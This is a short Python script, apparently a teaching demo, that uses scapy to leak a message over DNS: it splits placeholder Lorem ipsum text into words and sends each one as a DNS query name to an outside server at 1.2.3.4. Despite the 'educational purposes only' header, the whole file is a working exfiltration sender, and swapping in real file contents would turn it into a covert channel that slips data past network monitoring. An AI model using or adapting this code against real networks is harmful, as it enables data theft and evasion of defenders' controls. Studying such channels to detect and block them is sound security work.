# DNS Exfiltration 1 Sender - Basic data exfiltration from file from sender to receiver
# 
# For educational purposes only
#
# This script takes a message, splits it into individual words, and sends a DNS query to a receiver with each word as the query

from scapy import all
from scapy.all import *

target = '1.2.3.4' # Destination server
message = 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum' # Message

message_pieces = message.split(' ') # Split by whitespace

for line in message_pieces:
  print "Sending " + line
  send(IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=line))) #Send queries with each word as the query
  
  
